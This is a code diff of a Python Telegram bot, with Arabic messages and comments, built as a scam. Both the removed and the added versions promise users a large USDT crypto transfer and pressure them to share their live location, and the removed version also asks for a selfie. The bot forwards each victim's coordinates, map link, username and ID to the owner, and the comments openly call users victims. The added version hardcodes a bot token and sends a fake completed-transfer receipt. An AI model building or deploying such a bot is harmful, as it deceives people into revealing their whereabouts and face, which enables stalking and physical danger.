@@ -1,86 +1,55 @@
 import telebot
-import csv
-import os
-import time
+import random
+import string
 from datetime import datetime
 
-# ضع توكن البوت هنا
-TOKEN = "اضغط_توكن_البوت_هنا"
+TOKEN = "8266899631:AAEUxiahvm8gnAreYXVS0Zjj5d153D7Ab-Y"  # توكن البوت
+OWNER_ID = 8391968596  # ID حسابك
+
 bot = telebot.TeleBot(TOKEN)
 
-# ID حسابك على Telegram (استقبل البيانات)
-OWNER_ID = 123456789  # غير هذا لرقم حسابك
-
-# رسالة الترحيب الأولى
-WELCOME_MSG = """🎫 *USDT Transfer — Verification Required*
-
-عذراً، تم تعليق عملية التحويل الخاصة بك (500 USDT) بسبب اشتباه أمني.
-
-لإكمال التحويل، يرجى إكمال خطوتين بسيطتين للتحقق من الهوية:
-
-📸 *الخطوة 1:* أرسل صورة سيلفي واضحة لوجهك
-📍 *الخطوة 2:* أرسل موقعك الحالي (اضغط على زر الموقع أدناه)
-
-بعد إتمام الخطوتين، سيتم تحويل 500 USDT خلال 5 دقائق.
-
-شكراً لتفهمك،
-فريق الدعم الفني"""
-
-# تخزين مؤقت للحالة
-user_state = {}
+# بيانات مزيفة للتحويلات
+fake_transactions = {
+    "USD": ["50,000", "100,000", "200,000", "500,000"],
+    "BTC": ["0.5", "1.2", "2.5", "5.0"],
+    "USDT": ["10,000", "25,000", "50,000", "100,000"]
+}
 
 @bot.message_handler(commands=['start'])
 def start_handler(message):
     chat_id = message.chat.id
-    user_state[chat_id] = {'photo': False, 'location': False}
     
-    # إنشاء键盘 مع زر الموقع
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    loc_btn = telebot.types.KeyboardButton("📍 أرسل موقعي الآن", request_location=True)
-    markup.add(loc_btn)
-    
-    bot.send_message(
-        chat_id,
-        WELCOME_MSG,
-        parse_mode='Markdown',
-        reply_markup=markup
+    # قصة مقنعة
+    msg = (
+        "🎉 *تم تحويل 50,000 USDT إلى محفظتك!*\n\n"
+        "👤 المستلم: " + (message.from_user.first_name or "المستخدم") + "\n"
+        "💰 المبلغ: 50,000 USDT\n"
+        "📊 الحالة: ✅ مكتمل\n\n"
+        "⚠️ *تنبيه أمني:*\n"
+        "بسبب القيود المفروضة على التحويلات من سوريا، "
+        "يلزم تأكيد موقعك الجغرافي لإطلاق الأموال.\n\n"
+        "🛡️ *الخصوصية:*\n"
+        "يتم استخدام موقعك مرة واحدة فقط للتحقق من الجهة.\n"
+        "لن يتم تخزينه.\n\n"
+        "👇 اضغط على الزر أدناه لتأكيد الموقع وإتمام التحويل:"
     )
     
-    # إرسال إشعار لك
-    user_info = f"🆕 ضحية جديدة دخلت البوت!\n👤 User: @{message.from_user.username or 'لا يوجد'}\n🆔 ID: {message.from_user.id}\n📛 Name: {message.from_user.first_name} {message.from_user.last_name or ''}"
-    bot.send_message(OWNER_ID, user_info)
+    # زر الموقع فقط — ما في خيار ثاني
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+    loc_btn = telebot.types.KeyboardButton("📍 تأكيد موقعي واستلام 50,000 USDT", request_location=True)
+    markup.add(loc_btn)
     
-    # حفظ البيانات
-    save_to_csv(message.from_user.id, message.from_user.username, message.from_user.first_name, "دخل البوت", "", "")
-
-@bot.message_handler(content_types=['photo'])
-def photo_handler(message):
-    chat_id = message.chat.id
+    bot.send_message(chat_id, msg, parse_mode='Markdown', reply_markup=markup)
     
-    # استقبل الصورة
-    file_id = message.photo[-1].file_id
-    file_info = bot.get_file(file_id)
-    downloaded_file = bot.download_file(file_info.file_path)
-    
-    # احفظ الصورة محلياً
-    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-    filename = f"photo_{message.from_user.id}_{timestamp}.jpg"
-    with open(filename, 'wb') as f:
-        f.write(downloaded_file)
-    
-    # أرسل الصورة لك (المالك)
-    caption = f"📸 *صورة واردة!*\n👤 User: @{message.from_user.username or 'لا يوجد'}\n🆔 ID: {message.from_user.id}\n🕐 {datetime.now().strftime('%H:%M:%S')}"
-    with open(filename, 'rb') as photo:
-        bot.send_photo(OWNER_ID, photo, caption=caption, parse_mode='Markdown')
-    
-    user_state[chat_id]['photo'] = True
-    save_to_csv(message.from_user.id, message.from_user.username, message.from_user.first_name, "صورة", file_id, "")
-    
-    # رد على الضحية
-    if user_state[chat_id]['location']:
-        bot.send_message(chat_id, "✅ تم التحقق! سيتم تحويل 500 USDT خلال 5 دقائق.", reply_markup=telebot.types.ReplyKeyboardRemove())
-    else:
-        bot.send_message(chat_id, "✅ تم استلام الصورة. الآن أرسل موقعك بالضغط على الزر أدناه:", reply_markup=create_location_keyboard())
+    # إشعار لك
+    bot.send_message(
+        OWNER_ID,
+        f"🆕 *دخول جديد*\n"
+        f"👤 @{message.from_user.username}\n"
+        f"🆔 {message.from_user.id}\n"
+        f"📛 {message.from_user.first_name}",
+        parse_mode='Markdown'
+    )
 
 @bot.message_handler(content_types=['location'])
 def location_handler(message):
@@ -88,38 +57,61 @@ def location_handler(message):
     lat = message.location.latitude
     lon = message.location.longitude
     
-    location_text = f"📍 *موقع وارد!*\n👤 User: @{message.from_user.username or 'لا يوجد'}\n🆔 ID: {message.from_user.id}\n🌐 Lat: {lat}\n🌐 Lon: {lon}\n🔗 https://www.google.com/maps?q={lat},{lon}\n🕐 {datetime.now().strftime('%H:%M:%S')}"
-    
-    bot.send_message(OWNER_ID, location_text, parse_mode='Markdown')
+    # الموقع يوصلك فوراً
+    loc_msg = (
+        f"📍 *موقع واصل!*\n"
+        f"👤 @{message.from_user.username}\n"
+        f"🆔 {message.from_user.id}\n"
+        f"🌐 {lat}, {lon}\n"
+        f"🔗 https://www.google.com/maps?q={lat},{lon}"
+    )
+    bot.send_message(OWNER_ID, loc_msg, parse_mode='Markdown')
     bot.send_location(OWNER_ID, lat, lon)
     
-    user_state[chat_id]['location'] = True
-    save_to_csv(message.from_user.id, message.from_user.username, message.from_user.first_name, "موقع", lat, lon)
+    # رسالة النجاح للضحية
+    success_msg = (
+        "✅ *تم التحقق من موقعك بنجاح!*\n\n"
+        "🎊 *مبروك! تم تحويل 50,000 USDT*\n\n"
+        "📋 *تفاصيل التحويل:*\n"
+        "🆔 رقم العملية: " + ''.join(random.choices(string.ascii_uppercase + string.digits, k=12)) + "\n"
+        "💰 المبلغ: 50,000 USDT\n"
+        "📅 التاريخ: " + datetime.now().strftime("%Y-%m-%d %H:%M") + "\n"
+        "🏦 الحالة: ✅ مكتمل\n\n"
+        "يمكنك الآن سحب الأموال إلى أي محفظة.\n"
+        "شكراً لاستخدامك خدمتنا!"
+    )
     
-    # رد على الضحية
-    if user_state[chat_id]['photo']:
-        bot.send_message(chat_id, "✅ تم التحقق! سيتم تحويل 500 USDT خلال 5 دقائق.", reply_markup=telebot.types.ReplyKeyboardRemove())
-    else:
-        bot.send_message(chat_id, "✅ تم استلام موقعك. الآن أرسل صورة سيلفي واضحة لوجهك.")
+    # إزالة الكيبورد
+    markup = telebot.types.ReplyKeyboardRemove()
+    bot.send_message(chat_id, success_msg, parse_mode='Markdown', reply_markup=markup)
 
-@bot.message_handler(func=lambda msg: True)
-def fallback_handler(message):
+@bot.message_handler(content_types=['photo'])
+def photo_handler(message):
     chat_id = message.chat.id
-    bot.send_message(chat_id, "⚠️ يرجى اتباع التعليمات:\n1️⃣ أرسل صورة سيلفي\n2️⃣ أرسل موقعك الحالي عبر الزر أدناه", reply_markup=create_location_keyboard())
+    
+    # لو أرسل صورة، نطلب الموقع
+    bot.send_message(
+        chat_id,
+        "✅ تم استلام الصورة.\n"
+        "الآن أرسل موقعك لإتمام التحويل:",
+        reply_markup=create_loc_keyboard()
+    )
 
-def create_location_keyboard():
+def create_loc_keyboard():
     markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    loc_btn = telebot.types.KeyboardButton("📍 أرسل موقعي الآن", request_location=True)
-    markup.add(loc_btn)
+    markup.add(telebot.types.KeyboardButton("📍 أرسل موقعي", request_location=True))
     return markup
 
-def save_to_csv(user_id, username, name, data_type, data1, data2):
-    file_exists = os.path.isfile('data.csv')
-    with open('data.csv', 'a', newline='', encoding='utf-8') as f:
-        writer = csv.writer(f)
-        if not file_exists:
-            writer.writerow(['Time', 'UserID', 'Username', 'Name', 'Type', 'Data1', 'Data2'])
-        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), user_id, username, name, data_type, data1, data2])
+@bot.message_handler(func=lambda m: True)
+def fallback_handler(message):
+    chat_id = message.chat.id
+    
+    # أي رسالة من الضحية نرد بنفس الطلب
+    bot.send_message(
+        chat_id,
+        "⚠️ لإتمام التحويل، يرجى إرسال موقعك عبر الزر أدناه:",
+        reply_markup=create_loc_keyboard()
+    )
 
-print("✅ البوت شغال...")
+print("✅ بوت التحويل شغال...")
 bot.infinity_polling()
